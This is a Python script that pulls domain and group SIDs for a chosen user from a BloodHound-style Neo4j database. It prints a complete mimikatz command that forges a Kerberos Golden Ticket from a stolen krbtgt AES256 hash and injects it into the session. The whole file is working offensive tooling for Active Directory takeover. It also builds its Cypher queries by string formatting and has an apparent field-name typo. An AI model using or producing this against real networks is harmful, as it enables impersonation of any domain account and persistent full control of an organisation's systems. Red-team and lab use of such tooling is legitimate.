#!/usr/bin/env python
import argparse

from neo4jrestclient.client import GraphDatabase
from neo4jrestclient import client


def get_domain_sid(db, domain):
    domain_sid = None

    q = 'MATCH (d:Domain {{name: "{}"}}) return d.objectid'.format(domain)
    results = db.query(q)

    if len(results) > 1:
        print("An error occurred")
    else:
        domain_sid = results[0][0]

    return domain_sid


def get_user_groups(db, user, domain):
    user_sid = None
    group_sids = []

    q = 'MATCH (u:User {{name: "{}@{}"}}), (g:Group) MATCH (u)-[r:MemberOf*]->(g) return DISTINCT u.objectid, g.objectnid'.format(user, domain)
    results = db.query(q, returns=(str, str))

    for r in results:
        user_sid = r[0]
        group_sids.append(r[1])

    return (user_sid, group_sids)


def get_database_connection(server, username, password):
    return GraphDatabase("http://{}".format(server), username=username, password=password)


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("-s", "--server", help="Address for the Neo4J database", default="127.0.0.1:7474")
    parser.add_argument("-u", "--username", help="Neo4J Username", default="neo4j")
    parser.add_argument("-p", "--password", help="Neo4J Password", default="neo4j")
    parser.add_argument("domain", help="Golden Ticket Domain")
    parser.add_argument("user", help="Golden Ticket Username")
    parser.add_argument("krbtgt", help="AES256 Hash for krbtgt account")

    args = parser.parse_args()
    domain_user = args.user.upper()
    domain_name = args.domain.upper()

    db = get_database_connection(args.server, args.username, args.password)

    domain_sid = get_domain_sid(db, domain_name)
    user_sid, group_sids = get_user_groups(db, domain_user, domain_name)

    groups = []
    for sid in group_sids:
        if domain_sid in sid:
            groups.append(sid.split('-')[-1])

    user_sid = user_sid.split('-')[-1]

    print("mimikatz kerberos::golden /user:{} /aes256:{} /domain:{} /sid:{} /groups:{} /id:{} /endin:480 /renewmax:10080 /ptt".format(domain_user, args.krbtgt, domain_name, domain_sid, ",".join(groups), user_sid))


if __name__ == "__main__":
    main()
